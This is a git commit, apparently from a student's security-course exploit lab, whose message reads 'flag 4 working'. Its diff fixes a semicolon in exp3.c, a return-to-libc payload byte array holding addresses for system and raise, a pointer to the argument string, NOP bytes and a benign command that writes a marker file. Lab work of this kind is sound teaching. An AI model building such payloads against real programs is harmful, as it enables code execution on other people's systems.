f5fd435868e95d2b1da000d9b173a1eb28b408f6
malique-bodie <malique_bodie@brown.edu>
2021-10-28 03:09:32 -0400

    flag 4 working

--- exp3.c
+++ exp3.c
@@ -25,10 +25,10 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	"\x40\x30\xe2\xb3" //0xb3e23040 <system>
 	"\x40\x2d\xe1\xb3" // 0xb3e12d40 <raise>
-	"\x2c\xc3\xff\xbf"; // <system arg> pointer to string 0xBFFFC32C
+	"\x2c\xc3\xff\xbf" // <system arg> pointer to string 0xBFFFC32C
 	"\x0a" // <raise> argument
 	"\x90\x90\x90"
-	"echo -n xyzzy! > magic.txt\n"
+	"echo -n xyzzy! > magic.txt\n";
 
 
 	/* ------------------------------------	*/
